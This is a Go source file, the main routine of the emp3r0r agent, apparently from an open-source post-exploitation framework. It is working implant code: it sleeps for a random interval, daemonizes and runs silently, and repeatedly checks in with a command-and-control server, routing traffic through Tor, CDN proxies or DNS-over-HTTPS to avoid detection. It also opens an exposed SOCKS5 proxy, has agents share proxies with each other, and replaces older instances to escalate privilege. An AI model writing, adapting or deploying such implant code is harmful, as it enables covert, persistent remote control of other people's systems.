//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
)

func main() {
	var err error
	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
	replace := flag.Bool("replace", false, "Replace existing agent process")
	silent := flag.Bool("silent", false, "Suppress output")
	daemon := flag.Bool("daemon", false, "Daemonize")
	version := flag.Bool("version", false, "Show version info")
	flag.Parse()

	// version
	if *version {
		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)

		return
	}

	// don't be hasty
	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)

	// mkdir -p UtilsPath
	// use absolute path
	// TODO find a better location for temp files
	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
		}
	}

	// silent switch
	log.SetOutput(ioutil.Discard)
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
	if !*silent {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)

		// redirect everything to log file
		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
			emp3r0r_data.AgentRoot),
			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
		if err != nil {
			log.Printf("error opening emp3r0r.log: %v", err)
		} else {
			log.SetOutput(f)
			defer f.Close()
			err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
			if err != nil {
				log.Fatalf("Cannot redirect stderr to log file: %v", err)
			}
		}
	}

	// PATH
	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", emp3r0r_data.UtilsPath))

	// HOME
	u, err := user.Current()
	if err != nil {
		log.Printf("Get user info: %v", err)
	} else {
		os.Setenv("HOME", u.HomeDir)
	}

	// extract bash
	err = agent.ExtractBash()
	if err != nil {
		log.Printf("[-] Cannot extract bash: %v", err)
	}
	if !util.IsFileExist(emp3r0r_data.DefaultShell) {
		emp3r0r_data.DefaultShell = "/bin/sh"
	}

	// daemonize
	if *daemon {
		args := os.Args[1:]
		i := 0
		for ; i < len(args); i++ {
			if args[i] == "-daemon=true" || args[i] == "-daemon" {
				args[i] = "-daemon=false"
				break
			}
		}
		cmd := exec.Command(os.Args[0], args...)
		err := cmd.Start()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
		os.Exit(0)
	}

	// if the agent's process name is not "emp3r0r"
test_agent:
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}

		// exit, leave the existing agent instance running
		if agent.IsAgentAlive() {
			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
				log.Println("Escalating privilege...")
			} else if !*replace {
				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
					os.Getppid(),
					os.Getpid())

				util.TakeASnap()
				goto test_agent
			}
		}

		// if agent is not responsive, kill it, and start a new instance
		// after IsAgentAlive(), the PID file gets replaced with current process's PID
		// if we kill it, we will be killing ourselves
		if proc.Pid != os.Getpid() {
			err = proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}

	// start socket listener
	go socketListen()

	// parse C2 address
	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
	emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)

	// if CC is behind tor, a proxy is needed
	if tun.IsTor(emp3r0r_data.CCAddress) {
		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
		emp3r0r_data.AgentProxy = *c2proxy
		if *c2proxy == "" {
			emp3r0r_data.AgentProxy = "socks5://127.0.0.1:9050"
		}
		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, emp3r0r_data.AgentProxy)
	}

	// if user specified a proxy, use it
	if *c2proxy != "" {
		emp3r0r_data.AgentProxy = *c2proxy
	}

	// DNS
	if *doh != "" {
		emp3r0r_data.DoHServer = *doh
	}
	if emp3r0r_data.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			emp3r0r_data.DoHServer,
			dns.DoHCache())
		if err != nil {
			log.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	if *cdnProxy != "" {
		emp3r0r_data.CDNProxy = *cdnProxy
	}
	upper_proxy := emp3r0r_data.AgentProxy // when using CDNproxy
	if emp3r0r_data.CDNProxy != "" {
		log.Printf("C2 is behind CDN, using CDNProxy %s", emp3r0r_data.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if emp3r0r_data.DoHServer != "" {
			dns = emp3r0r_data.DoHServer
		}
		go func() {
			for !tun.IsProxyOK(cdnproxyAddr) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], emp3r0r_data.CDNProxy, upper_proxy, dns)
				if err != nil {
					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
		emp3r0r_data.AgentProxy = cdnproxyAddr
	}

	// agent root
	if !util.IsFileExist(emp3r0r_data.AgentRoot) {
		err = os.MkdirAll(emp3r0r_data.AgentRoot, 0700)
		if err != nil {
			log.Printf("MkdirAll %s: %v", emp3r0r_data.AgentRoot, err)
		}
	}

	// socks5 proxy
	go func() {
		// start a socks5 proxy
		err := agent.Socks5Proxy("on", "0.0.0.0:"+emp3r0r_data.ProxyPort)
		if err != nil {
			log.Printf("Socks5Proxy on %s: %v", emp3r0r_data.ProxyPort, err)
			return
		}
		defer func() {
			err := agent.Socks5Proxy("off", "0.0.0.0:"+emp3r0r_data.ProxyPort)
			if err != nil {
				log.Printf("Socks5Proxy off (%s): %v", emp3r0r_data.ProxyPort, err)
			}
		}()
	}()

	// do we have internet?
	checkInternet := func(cnt *int) bool {
		if tun.HasInternetAccess() {
			// if we do, we are feeling helpful
			if *cnt == 0 {
				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
				ctx, cancel := context.WithCancel(context.Background())
				go agent.StartBroadcast(true, ctx, cancel)
			}
			return true

		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
			*cnt++
			// we don't, just wait for some other agents to help us
			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
			if *cnt == 0 {
				ctx, cancel := context.WithCancel(context.Background())
				go func() {
					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
					err := agent.BroadcastServer(ctx, cancel, "")
					if err != nil {
						log.Fatalf("BroadcastServer: %v", err)
					}
				}()
				for ctx.Err() == nil {
					if emp3r0r_data.AgentProxy != "" {
						log.Printf("[+] Thank you! We got a proxy: %s", emp3r0r_data.AgentProxy)
						return true
					}
				}
			}
			return false
		}

		return true
	}
	i := 0
	for !checkInternet(&i) {
		log.Printf("[%d] Checking Internet connectivity...", i)
		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
	}

	// apply whatever proxy setting we have just added
	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
	if emp3r0r_data.AgentProxy != "" {
		log.Printf("Using proxy: %s", emp3r0r_data.AgentProxy)
	} else {
		log.Println("Not using proxy")
	}

connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if emp3r0r_data.IndicatorWaitMax > 0 &&
		emp3r0r_data.CCIndicator != "" &&
		emp3r0r_data.CCIndicatorText != "" { // check indicator URL or not

		if !agent.IsCCOnline(emp3r0r_data.AgentProxy) {
			log.Println("CC not online")
			time.Sleep(time.Duration(util.RandInt(emp3r0r_data.IndicatorWaitMin, emp3r0r_data.IndicatorWaitMax)) * time.Minute)
			goto connect
		}
	}

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	emp3r0r_data.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
		go agent.VaccineHandler()
	}
	err = agent.CCMsgTun(ctx, cancel)
	if err != nil {
		log.Printf("CCMsgTun: %v, reconnecting...", err)
	}
	goto connect
}

// listen on a unix socket, used to check if agent is responsive
func socketListen() {
	// if socket file exists
	if util.IsFileExist(emp3r0r_data.SocketName) {
		log.Printf("%s exists, testing connection...", emp3r0r_data.SocketName)
		if agent.IsAgentAlive() {
			log.Fatalf("%s exists, and agent is alive, aborting", emp3r0r_data.SocketName)
		}
		err := os.Remove(emp3r0r_data.SocketName)
		if err != nil {
			log.Fatalf("Failed to delete socket: %v", err)
		}
	}

	l, err := net.Listen("unix", emp3r0r_data.SocketName)
	if err != nil {
		log.Fatal("listen error:", err)
	}

	for {
		fd, err := l.Accept()
		if err != nil {
			log.Fatal("accept error:", err)
		}
		go server(fd)
	}
}

// handle connections to our socket: tell them my PID
func server(c net.Conn) {
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}

		data := buf[0:nr]
		log.Println("Server got:", string(data))

		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
		_, err = c.Write([]byte(reply))
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}
